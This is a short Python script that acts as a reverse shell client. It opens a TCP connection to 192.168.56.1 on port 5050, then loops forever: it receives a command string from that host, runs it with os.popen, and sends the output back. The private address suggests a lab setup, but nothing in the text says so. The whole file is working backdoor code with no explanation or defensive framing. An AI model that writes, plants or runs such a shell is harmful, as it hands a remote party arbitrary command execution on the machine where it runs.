import socket
import threading
import os

if __name__ == "__main__":
    HOST = "192.168.56.1"
    PORT = 5050

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((HOST, PORT))

    while True:
        commend = client.recv(2048).decode()
        output = os.popen(commend).read()
        client.sendall(output.encode())
